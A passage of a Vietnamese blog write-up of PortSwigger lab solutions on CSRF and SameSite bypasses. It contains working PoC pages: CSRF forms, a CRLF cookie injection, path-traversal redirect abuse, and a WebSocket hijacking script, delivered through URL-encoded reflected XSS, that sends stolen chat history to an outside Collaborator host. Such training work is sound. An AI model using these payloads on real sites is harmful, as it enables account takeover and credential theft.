<h3 id="Lab-CSRF-where-token-is-duplicated-in-cookie"><a href="#Lab-CSRF-where-token-is-duplicated-in-cookie" class="headerlink" title="Lab: CSRF where token is duplicated in cookie"></a>Lab: CSRF where token is duplicated in cookie</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF. It attempts to use the insecure &quot;double submit&quot; CSRF prevention technique.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/S1ODEMml-e.png" alt="image"></p>
<p>Lại vẫn là chức năng update email đó bây giờ ta sẽ test thử với trường <code>csrf</code> xem có tương tác gì với nó được không.</p>
<p><img src="https://hackmd.io/_uploads/B1q3VMQlWx.png" alt="image"></p>
<p>Lúc đầu thử đổi sang abc123 nhưng nó báo invalid sau đó mình đổi thêm ở bên dưới thì kết quả thì nó lại trả 302 khá ảo có vẻ nó bị duplicate rồi như đề bài nói.</p>
<p><img src="https://hackmd.io/_uploads/H18-UG7g-x.png" alt="image"></p>
<p>Ở đây ta có chức năng <code>search</code> chắc lấy lại payload cũ test thử.</p>
<p><img src="https://hackmd.io/_uploads/S1nOLMmxZl.png" alt="image"></p>
<p>Ngon lành rồi ta nhét thử csrf tự chế vào mà nó vẫn inject vào oke bây giờ ta sẽ lấy payload cũ của bài trước rồi sửa chút để exploit.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a9d00c904e3730980189ad600830017.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker@evil.com&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://0a9d00c904e3730980189ad600830017.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abc123%3b%20SameSite=None&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.forms[0].submit();&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/rySawGQgbl.png" alt="image"></p>
<p>Thành công khai thác lab này.</p>
<h3 id="Lab-SameSite-Lax-bypass-via-method-override"><a href="#Lab-SameSite-Lax-bypass-via-method-override" class="headerlink" title="Lab: SameSite Lax bypass via method override"></a>Lab: SameSite Lax bypass via method override</h3><p><img src="https://hackmd.io/_uploads/rkqCuXQgWx.png" alt="image"></p>
<p>Vào thẳng request luôn thì ta thấy rằng các trường csrf đã bị xoá hết có vẻ như không có gì để lợi dụng ngoài cái cookie session được cấp ở đây.</p>
<p>Ở đây có hint là về SameSite tham khảo ở đây <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions</a>.</p>
<p>Giải thích nôm na thì : </p>
<ul>
<li>Cookie là một đoạn dữ liệu nhỏ mà website lưu vào trình duyệt của bạn, thường dùng để giữ trạng thái đăng nhập. Tuy nhiên, nếu trình duyệt tự động gửi cookie khi bạn truy cập từ một trang web khác, thì hacker có thể lợi dụng điều này để thực hiện tấn công CSRF.</li>
<li>Để ngăn chặn điều đó, trình duyệt có thêm thuộc tính SameSite khi website đặt cookie.</li>
</ul>
<p>Ở đây khi nhìn vào request response ta không hề thấy thuộc tính <code>SameSite=Strict</code> thì có lẽ mình có thể bypass được SameSite này vì có vẻ như nó xài LAX.</p>
<p><img src="https://hackmd.io/_uploads/Hy1Q67mxbe.png" alt="image"></p>
<p>Ở đây ta sẽ tiến hành thay đổi method thành GET thì kết quả trả về rằng nó chỉ allow mỗi POST thôi có vẻ đó là lớp bảo vệ của SameSite, bây giờ ta sẽ thử vài trick để bypass nó.</p>
<p><img src="https://hackmd.io/_uploads/SkwPT7mxWl.png" alt="image"></p>
<p>Ở đây ta sử dụng cách Overiding method thì thành công bypass được lớp filter đó vậy là ta hoàn toàn có thể từ đây lợi đụng để tạo payload cho exploit server.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a6800e303a7b0b4807c6735003e0042.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;moimoimoi<span class="symbol">&amp;#64;</span>hacker<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;<span class="symbol">&amp;#95;</span>method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;POST&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://0a6800e303a7b0b4807c6735003e0042.web-security-academy.net/my-account/change-email?email=aloaloalo@phatmai.net&amp;_method=POST&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Giải thích cơ chế : </p>
<ul>
<li>Thực hiện một cuộc tấn công CSRF để thay đổi địa chỉ email của nạn nhân trên website mục tiêu, bằng cách lợi dụng việc trình duyệt Chrome vẫn gửi cookie trong các yêu cầu GET có điều hướng cấp cao (top-level navigation), ngay cả khi cookie có thuộc tính SameSite&#x3D;Lax.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HkZcRXQgWl.png" alt="image"></p>
<p>Thành công solve lab này.</p>
<h3 id="Lab-SameSite-Strict-bypass-via-client-side-redirect"><a href="#Lab-SameSite-Strict-bypass-via-client-side-redirect" class="headerlink" title="Lab: SameSite Strict bypass via client-side redirect"></a>Lab: SameSite Strict bypass via client-side redirect</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim&#x27;s email address. You should use the provided exploit server to host your attack.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p>Như tiều đề ta đã đọc có vẻ như nó vẫn xài SameSite để bảo vệ và lần này thì nó xài đến <code>Strict</code> nên ta sẽ tìm cách bypass với thuộc tính là <code>SameSite:Strict</code>.</p>
<p><img src="https://hackmd.io/_uploads/HJ4UDVQgZg.png" alt="image"></p>
<p>Sau khi login thì ta có thể thấy luôn dòng <code>Secure; HttpOnly; SameSite=Strict</code> khẳng định nó đã áp dụng vào đây bây giờ ta sẽ tìm hiểu các request tiếp theo vì ở đây ta biết rằng là <code>Strict</code> sẽ chặn hết tất cả các request cùng chung 1 site.</p>
<p><img src="https://hackmd.io/_uploads/HyvxoOXeWe.png" alt="image"></p>
<p>Nhìn vào request update email có vẻ như chẳng có cái gì được mỗi cái cookie session nhưng ở site này nó đã dùng <code>Same-Site: Strict</code> nên cách tấn công của lab trước không còn khả thi nữa. Nên ta sẽ phải tìm một nơi mà payload cookie của mình được redirect đi ta phải tìm cái gadget.</p>
<p><img src="https://hackmd.io/_uploads/Bklf2_mlZx.png" alt="image"></p>
<p>Ở đây ta phát hiện rằng nó có chức năng post comment lên một bài viết nào đó, ý tưởng ở đây là : </p>
<ul>
<li><p>Khi bạn bình luận vào bài viết, bạn được chuyển đến &#x2F;post&#x2F;comment&#x2F;confirmation?postId&#x3D;x.</p>
</li>
<li><p>Sau vài giây, JavaScript sẽ redirect đến &#x2F;post&#x2F;x.</p>
</li>
<li><p>Nếu bạn chỉnh postId&#x3D;1&#x2F;..&#x2F;..&#x2F;my-account, thì redirect sẽ đến &#x2F;my-account</p>
</li>
</ul>
<p>Đây là cách để lợi dụng client-side redirect từ trong chính domain nên không lo ăn filtet strict của same site </p>
<p><img src="https://hackmd.io/_uploads/BJapTdXg-x.png" alt="image"></p>
<p>Ta thử inject đoạn string nào đó sau đó thực hiện path traversal để redirect về <code>/my-account</code> ở đây ta có thể thấy nó trả về đoạn script là <code>redirectOnConfirmation(&#39;/post&#39;);</code> nó đóng phần khẳng định rằng sau khi đường dẫn được chuẩn hoá thì nó sẽ được redirect về nơi mình mong muốn.</p>
<p>Rồi bây giờ dựa vào kết quả trên ta sẽ tạo payload như những lab trước.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://0ada005803ea228080fb62da00320029.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hackerlord%40web-security-academy.net%26submit=1&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Sau đó ta tạo payload CSRF thay từ request thay đổi email bằng generate csrf POC.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0ada005803ea228080fb62da00320029.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phat<span class="symbol">&amp;#64;</span>hacker<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://0ada005803ea228080fb62da00320029.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hackerlord%40web-security-academy.net%26submit=1&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HklfeYXgZe.png" alt="image"></p>
<p>Thành công solve lab này.</p>
<h3 id="Lab-SameSite-Strict-bypass-via-sibling-domain"><a href="#Lab-SameSite-Strict-bypass-via-sibling-domain" class="headerlink" title="Lab: SameSite Strict bypass via sibling domain"></a>Lab: SameSite Strict bypass via sibling domain</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim&#x27;s account.</span><br><span class="line"></span><br><span class="line">To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim&#x27;s chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.</span><br><span class="line"></span><br><span class="line">If you haven&#x27;t done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/H1Gm6t7eZl.png" alt="image"></p>
<p>Ở lab này ta có chức năng chat chít với websockets bây giờ ta thử chat vài câu xem nó sẽ ra request như thế nào.</p>
<p><img src="https://hackmd.io/_uploads/Sk5yg9Qgbl.png" alt="image"></p>
<p>Sau khi chat ta chạy sang đống websocket history và thấy rằng ở đây ta có một request ready để bắt đầu chat với live chat bây giờ đưa nó vào repeater và send nó thử xem kết quả ra sao.</p>
<p><img src="https://hackmd.io/_uploads/HJz4e5Xx-l.png" alt="image"></p>
<p>Nó hiện ra những gì ta đã nhắn với nó ở đây mình trash talk với cái này khá nhiều :v </p>
<p>Ta để ý với request khi gọi đến chat ta có trường Switching Protocol cùng với đó là websocket và chức năng chat này có bị dính CSRF vì ngoài ra nó còn có thêm cả key.</p>
<p><img src="https://hackmd.io/_uploads/ry0Ufcmebe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJGnzcmgZe.png" alt="image"></p>
<p>Bên cạnh đó ta còn tìm thấy được URL của chat form của lab đó là <code>https://0a0d004904e114468051037300ff00aa.web-security-academy.net/chat</code> ngoài ra ở bên dưới ta còn có cả <code>resouces/js/chat.js</code> </p>
<p><img src="https://hackmd.io/_uploads/SyTsX57ebx.png" alt="image"></p>
<p>Truy cập vào ta thấy ở đây có một cái Event Handler newSocket.</p>
<p><img src="https://hackmd.io/_uploads/rJrlEq7xbx.png" alt="image"></p>
<p>Ngoài ra đây còn có cả nơi để handle message, ta hoàn toàn có thể lợi dụng cái này để exfiltrate đến endpoit mà ta điều khiển nên ta sẽ lấy đoạn code đó về để tạo payload thử.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://0a0d004904e114468051037300ff00aa.web-security-academy.net/chat&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        ws.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://d9nxjng7bthxpmcwzcspvjxr2i89wzko.oastify.com&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Với payload này ta gửi thử cho exploit server xem thử liệu nó có nhận được ready chat không.</p>
<p><img src="https://hackmd.io/_uploads/SkCOH9Qx-x.png" alt="image"></p>
<p>Vậy là ta xác thực được rằng bên phía server nhận được lệnh ready để tạo con chatbot session rồi.</p>
<p><img src="https://hackmd.io/_uploads/SJ-qO97e-x.png" alt="image"></p>
<p>Ở đây ta tìm thấy một sibling web với web mà ta đang cố exploit bên cạnh đó nó còn có thuộc tính là <code>Access-Control-Allow-Origin</code> vậy thì 2 cái này không còn dính hạn chế của Same Site <code>https://cms-0a0d004904e114468051037300ff00aa.web-security-academy.net</code> ta sẽ truy cập web này xem có attack surface không.</p>
<p><img src="https://hackmd.io/_uploads/BJafK5mxWg.png" alt="image"></p>
<p>Truy cập vào ta thấy một trang login khá đơn giản bây giờ test thử xem có XSS không ta sẽ inject js vào username xem sao.</p>
<p><img src="https://hackmd.io/_uploads/ryT8F9Xxbe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Skt6Kc7x-l.png" alt="image"></p>
<p>Okay nó dính XSS thật và đây ta có một bug reflected XSS ta thấy rằng alert(1) đã được call lên bây giờ ta thử đổi method khác xem liệu nó còn thực thi được XSS không.</p>
<p><img src="https://hackmd.io/_uploads/B1pmqcQxZx.png" alt="image"></p>
<p>Ta sẽ tiến hành copy URL của request này và paste ra browser xem thử có còn reflect XSS không.</p>
<p><img src="https://hackmd.io/_uploads/SypUq57l-g.png" alt="image"></p>
<p>Với GET method thì XSS vẫn hoạt động vậy là ta có nơi để exploit rồi bây giờ ta lợi dụng reflected XSS để nhét payload trước mình đã dùng để xem có phản ứng gì.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://0a0d004904e114468051037300ff00aa.web-security-academy.net/chat&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        ws.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://sa6ck2hmc8icq1db0rt4wyy63x9oxgl5.oastify.com&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/S1nti5QlWe.png" alt="image"></p>
<p>Tiến hành URL encode hết đống này để tránh lỗi sau đó ta tạo thêm một script để có thể inject đến domain sibling mà dính XSS.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://cms-0a0d004904e114468051037300ff00aa.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%30%64%30%30%34%39%30%34%65%31%31%34%34%36%38%30%35%31%30%33%37%33%30%30%66%66%30%30%61%61%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%73%61%36%63%6b%32%68%6d%63%38%69%63%71%31%64%62%30%72%74%34%77%79%79%36%33%78%39%6f%78%67%6c%35%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&amp;password=lmao&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Ném nó lên exploit server xem thử nó có gửi response về burp collab không.</p>
<p><img src="https://hackmd.io/_uploads/SkXc3cQe-l.png" alt="image"></p>
<p>Thành công bịp chat để lấy được username password của carlos.</p>
<p><img src="https://hackmd.io/_uploads/BkN635XgZl.png" alt="image"></p>
<p>Login vào là hoàn thành bài lab.</p>
<h3 id="Lab-SameSite-Lax-bypass-via-cookie-refresh"><a href="#Lab-SameSite-Lax-bypass-via-cookie-refresh" class="headerlink" title="Lab: SameSite Lax bypass via cookie refresh"></a>Lab: SameSite Lax bypass via cookie refresh</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim&#x27;s email address. You should use the provided exploit server to host your attack.</span><br><span class="line"></span><br><span class="line">The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter</span><br><span class="line"></span><br><span class="line">Note</span><br><span class="line">The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp&#x27;s built-in Chromium browser) to test your exploit.</span><br><span class="line"></span><br><span class="line">Hint</span><br><span class="line">You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.</span><br><span class="line"></span><br><span class="line">Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onclick = () =&gt; &#123;</span><br><span class="line">        window.open(&#x27;about:blank&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/SJBINrVxWx.png" alt="image"></p>
<p>Đến với lab này thì vẫn là chức năng update email bị lỗi bây giờ ta thử update bắt request xem có nhưng gì được xử lý.</p>
<p><img src="https://hackmd.io/_uploads/HyA_HHNl-l.png" alt="image"></p>
<p>Ta để ý rằng ở trong request thay đổi email này thì phần response đã khác với lab trước, ở đây request có nội dung này không chứa bất token không thể đoán trước nào, do đó có thể dễ bị tấn công bởi CSRF trong trường hợp ta có thể bypass bất kỳ hạn chế cookie SameSite nào.</p>
<p><img src="https://hackmd.io/_uploads/Skj0IB4gWg.png" alt="image"></p>
<p>Ta kiểm tra request call back của Oauth ở trường set-cookie ta thấy rằng không còn <code>Same-Site: Strict</code> nữa vậy nên ta có thể kết luận rằng nó sử dụng default của browser là LAX và LAX thì có cách để bypass được.</p>
<p>Bây giờ ta tạo một cái exploit để đổi email thử xem có hoạt động không.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0ae200dc040bb8cd816f2022002a00ea.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phatmai@hack.com&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span 